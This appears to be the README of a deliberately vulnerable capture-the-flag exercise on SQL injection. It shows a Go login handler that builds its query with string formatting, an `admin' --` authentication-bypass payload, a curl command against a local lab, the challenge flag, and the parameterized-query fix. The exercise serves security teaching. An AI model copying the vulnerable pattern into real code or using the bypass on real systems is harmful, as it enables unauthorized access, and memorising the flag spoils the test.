# A03: Injection

⚠️ **Intentionally vulnerable — do not deploy to a real network or reuse this code.**

## Scenario

A staff login portal at `/`. Submitting the form posts to `/login`.

## The bug

`main.go`'s `loginHandler` builds the SQL query with `fmt.Sprintf` instead of a
parameterized query:

```go
query := fmt.Sprintf(
    "SELECT username, is_admin FROM users WHERE username = '%s' AND password = '%s' LIMIT 1",
    username, password,
)
```

Any single quote in `username` or `password` breaks out of the string literal.

## Exploit

Log in with:
- **username**: `admin' --`
- **password**: anything

The `--` comments out the rest of the query, so the password check never runs
and the query matches the `admin` row on username alone.

```bash
curl -X POST http://localhost:9003/login \
  --data-urlencode "username=admin' --" \
  --data-urlencode "password=x"
```

## Flag

`CTF{a03_sql1_1s_st1ll_h3r3}`

## The fix (for reference)

Use a parameterized query: `db.QueryRow("SELECT ... WHERE username = ? AND password = ?", username, password)`.
The platform API (`platform/internal/handlers/auth.go`) does this correctly —
compare the two.
